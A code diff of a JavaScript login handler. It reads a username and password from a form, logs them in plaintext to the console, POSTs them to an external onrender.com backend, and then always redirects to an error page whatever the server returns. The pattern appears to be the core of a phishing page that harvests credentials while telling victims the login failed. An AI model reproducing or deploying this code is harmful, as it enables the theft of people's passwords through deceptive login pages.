@@ -1,34 +1,22 @@
-document.addEventListener("DOMContentLoaded", function () {
-    const loginBtn = document.getElementById("login-btn");
-
-    if (loginBtn) {
-        loginBtn.addEventListener("click", login);
-    }
-});
-
 async function login() {
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
 
-    console.log("Attempting login with:", username, password); // Debugging
+    console.log("Sending data:", { username, password }); // Debugging line
 
     try {
         const response = await fetch("https://backend-redf.onrender.com/login", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ username, password })
+            body: JSON.stringify({ username, password }) // Convert to JSON
         });
 
-        console.log("Response Status:", response.status); // Check HTTP status
-        console.log("Response Headers:", response.headers);
+        console.log("Response status:", response.status); // Check server response
 
-        const result = await response.json();
-        console.log("Server Response:", result);
-
-        // Redirect to error.html always
+        // Redirect to error.html
         window.location.href = "error.html";
     } catch (error) {
-        console.error("Fetch Error:", error);
-        alert("Something went wrong! Check console for details.");
+        console.error("Fetch error:", error);
+        alert("Something went wrong!");
     }
 }
